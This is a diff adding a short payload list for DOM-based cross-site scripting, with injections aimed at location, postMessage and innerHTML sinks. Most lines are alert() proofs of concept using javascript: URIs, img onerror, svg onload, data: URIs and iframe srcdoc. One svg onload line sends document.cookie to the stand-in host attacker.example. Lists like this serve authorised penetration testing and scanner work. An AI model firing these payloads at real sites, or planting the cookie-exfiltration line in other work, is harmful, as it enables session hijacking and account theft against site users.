@@ -1,0 +1,9 @@
+# xss/dom — sinks driven by location / postMessage / innerHTML
+javascript:alert(document.domain)
+#<script>alert(1)</script>
+?q=<img src=x onerror=alert(1)>
+data:text/html,<script>alert(1)</script>
+javascript:alert`1`
+"><img src=x onerror=alert(document.cookie)>
+'><svg onload=fetch('//attacker.example/?c='+document.cookie)>
+#"><iframe srcdoc="<script>parent.alert(1)</script>">
